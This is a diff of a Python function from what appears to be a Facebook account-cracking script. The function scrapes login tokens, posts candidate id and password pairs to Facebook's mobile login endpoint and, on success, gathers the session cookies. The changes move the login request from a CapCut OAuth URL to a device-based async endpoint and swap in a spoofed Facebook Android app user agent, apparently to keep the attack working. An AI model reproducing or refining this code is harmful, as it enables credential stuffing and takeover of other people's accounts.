@@ -1212,7 +1212,7 @@ def m6(idf,pwv):
             #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
             #sys.stdout.flush()
    pro = random.choice(ugen)
-   free_fb = session.get('https://free.facebook.com').text
+   free_fb = session.get('https://m.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1224,7 +1224,7 @@ def m6(idf,pwv):
             "pass":ps,
             "login":"Log In"}
    header_freefb = {
-            'authority': 'www.facebook.com',
+            'authority': 'm.facebook.com',
             'method': 'GET',
             'path': '/login/device-based/login/async/',
             'scheme': 'https',
@@ -1239,8 +1239,8 @@ def m6(idf,pwv):
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-   lo = session.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXV',headers=header_freefb,data=log_data).text
+            'user-agent': 'Mozilla/5.0 (Linux; Android 11; Pixel 4 Build/RQ1A.210205.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.212 Mobile Safari/537.36 [FBAN/FB4A;FBAV/288.0.0.72.119;FBBV/176964424;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/176964424;FBCR/]'}
+   lo = session.post('https://m.facebook.com/login/device-based/login/async/?',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
